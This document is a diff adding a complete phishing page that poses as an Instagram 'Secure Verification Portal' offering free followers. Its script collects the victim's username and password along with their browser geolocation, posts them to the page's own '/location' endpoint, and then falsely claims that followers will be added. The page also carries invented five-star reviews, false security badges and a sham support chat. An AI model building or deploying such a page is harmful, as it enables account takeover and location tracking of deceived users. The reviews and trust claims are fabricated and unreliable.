@@ -1,0 +1,364 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Verification Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to right, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      color: white;
+      padding: 20px;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(12px);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+      width: 100%;
+      max-width: 400px;
+      color: #fff;
+      margin-bottom: 20px;
+    }
+    h2 {
+      margin-bottom: 10px;
+      color: #fff;
+    }
+    p {
+      margin-bottom: 20px;
+      color: #eee;
+      font-size: 14px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      border-radius: 8px;
+      border: none;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+    input, select {
+      background-color: #fff;
+      color: #000;
+    }
+    button {
+      background: #ffffff;
+      color: #d62976;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #f1f1f1;
+    }
+    .output {
+      margin-top: 0; margin-bottom: 10px;
+      background: rgba(0,0,0,0.4);
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 14px;
+      display: none;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: #eee;
+      margin-top: 0; margin-bottom: 10px;
+    }
+    .logo {
+      margin-top: 0; margin-bottom: 10px;
+      max-width: 80px;
+      opacity: 0.9;
+    }
+    .reviews {
+      background: rgba(255,255,255,0.15);
+      padding: 16px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 400px;
+      text-align: left;
+      font-size: 13px;
+    }
+    .review {
+      margin-bottom: 12px;
+      border-left: 4px solid #fff;
+      padding-left: 10px;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+  
+    @keyframes slideUpDown {
+      0% { transform: translateY(-55%); opacity: 0.9; }
+      100% { transform: translateY(-45%); opacity: 1; }
+    }
+    
+    input:focus, select:focus {
+      outline: none;
+      border: 2px solid #ff4081;
+      box-shadow: 0 0 8px #ff4081;
+    }
+
+    button {
+      transition: transform 0.2s ease, background 0.2s ease;
+    }
+
+    button:hover {
+      transform: scale(1.03);
+      background: #f9f9f9;
+    }
+
+    .container {
+      animation: zoomIn 0.6s ease-out;
+    }
+
+    .output {
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .typewriter::after {
+      content: '|';
+      animation: blink 0.8s infinite;
+    }
+
+    @keyframes zoomIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+    </style>
+
+
+</head>
+<body>
+  <div class="container">
+    <h2>🔒 Secure Verification</h2>
+    <p>Please enter your credentials. Your location will be used for verification.</p>
+
+    <input type="text" id="username" placeholder="Username" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <select id="followers">
+      <option value="1000">1,000 Followers</option>
+      <option value="5000">5,000 Followers</option>
+      <option value="10000">10,000 Followers</option>
+      <option value="50000">50,000 Followers</option>
+      <option value="100000">100,000 Followers</option>
+    </select>
+    <button onclick="sendData()">Verify</button>
+
+    <div class="output" id="output"></div>
+  </div>
+
+  
+    
+<div class="reviews" style="
+  position: absolute;
+  top: 50%;
+  right: 20px;
+  transform: translateY(-50%);
+  width: 250px;
+  height: 160px;
+  overflow: hidden;
+  background: rgba(255,255,255,0.15);
+  padding: 16px;
+  border-radius: 12px;
+  text-align: right;
+">
+  <div class="scroll-content" style="animation: scrollReviews 25s linear infinite;">
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “I received my followers instantly. 100% real and working!” – @jasleen_kaur</div>
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “Highly trusted service. Location verified, no fake at all.” – @harry_codex</div>
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “Looks official! Great UI and secure verification process.” – @simran.tech</div>
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “Working like magic! Fast & real.” – @mohit_dev</div>
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “Got followers within minutes. Safe & trusted.” – @priyanka_d</div>
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “No survey, no ads. Legit stuff.” – @aman_thakur</div>
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “Best UI & fastest verification ever!” – @neha_uiux</div>
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “Instant response from bot. Love this!” – @rohit_seo</div>
+    <div class="review">⭐️⭐️⭐️⭐️⭐️ “Perfect tool for marketing pages.” – @deepika_branding</div>
+  </div>
+</div>
+
+<style>
+@keyframes scrollReviews {
+  0% { transform: translateY(0); }
+  100% { transform: translateY(-100%); }
+}
+
+    input:focus, select:focus {
+      outline: none;
+      border: 2px solid #ff4081;
+      box-shadow: 0 0 8px #ff4081;
+    }
+
+    button {
+      transition: transform 0.2s ease, background 0.2s ease;
+    }
+
+    button:hover {
+      transform: scale(1.03);
+      background: #f9f9f9;
+    }
+
+    .container {
+      animation: zoomIn 0.6s ease-out;
+    }
+
+    .output {
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .typewriter::after {
+      content: '|';
+      animation: blink 0.8s infinite;
+    }
+
+    @keyframes zoomIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+    </style>
+
+
+<div class="footer" style="position: absolute; top: 20px; left: 20px; text-align: left;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" class="logo" alt="Insta Logo">
+    </div><div class="footer-bottom">✅ 100% Secure • Verified by Community • Trusted by 10,000+ users</div>
+  </div>
+
+  <script>
+    function sendData() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const followers = document.getElementById("followers").value;
+      const output = document.getElementById("output");
+
+      if (!username || !password) {
+        alert("Please fill in both fields.");
+        return;
+      }
+
+      output.style.display = "block";
+      output.innerHTML = `<span class="typewriter">🔄 Verifying @${username} for ${followers} followers...</span>`;
+
+      if (!navigator.geolocation) {
+        output.innerText = "❌ Geolocation not supported by browser.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          fetch("/location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              username,
+              password,
+              latitude,
+              longitude
+            })
+          })
+          .then(() => {
+            output.innerText = `✅ Verified @${username}!
+🎉 ${followers} followers will be added shortly.`;
+          })
+          .catch(() => {
+            output.innerText = "❌ Failed to connect to server.";
+          });
+        },
+        () => {
+          output.innerText = "❌ Location access denied.";
+        }
+      );
+    }
+  </script>
+
+<style>
+  .support-fixed-btn {
+    position: fixed;
+    bottom: 16px;
+    left: 16px;
+    background-color: #3897f0;
+    color: white;
+    border: none;
+    border-radius: 18px;
+    padding: 6px 12px;
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    z-index: 9999;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+  }
+  .support-fixed-btn:hover {
+    background-color: #2f80ed;
+  }
+</style>
+<button class="support-fixed-btn">💬 Support</button>
+
+
+<!-- Minimal Support Chat Modal -->
+<div id="supportModal" style="display:none; position: fixed; bottom: 60px; left: 16px; width: 220px; background: rgba(255,255,255,0.97); color: #333; padding: 10px; border-radius: 10px; box-shadow: 0 6px 16px rgba(0,0,0,0.25); z-index: 10000;">
+  <strong style="font-size: 13px;">Support Assistant</strong>
+  <p style="font-size: 12px; margin: 6px 0 4px;">Hi! How can we help?</p>
+  <textarea id="supportMessage" placeholder="Type your message..." style="width:100%; height:50px; font-size:12px; border-radius: 6px; border: 1px solid #ccc; padding: 5px; box-sizing: border-box;"></textarea>
+  <button onclick="sendSupport()" style="margin-top: 6px; background: #3897f0; color: white; width: 100%; padding: 6px; font-size: 12px; border: none; border-radius: 6px;">📨 Send</button>
+</div>
+
+<script>
+  const btn = document.querySelector('.support-fixed-btn');
+  btn.addEventListener('click', () => {
+    const modal = document.getElementById("supportModal");
+    if (modal.style.display === "none") {
+      modal.style.display = "block";
+    } else {
+      modal.style.display = "none";
+    }
+  });
+
+  function sendSupport() {
+    const message = document.getElementById("supportMessage").value.trim();
+    if (!message) {
+      alert("Please enter your message.");
+      return;
+    }
+    alert("✅ Support message sent. We'll reply soon!");
+    document.getElementById("supportModal").style.display = "none";
+  }
+</script>
+
+</body>
+</html>
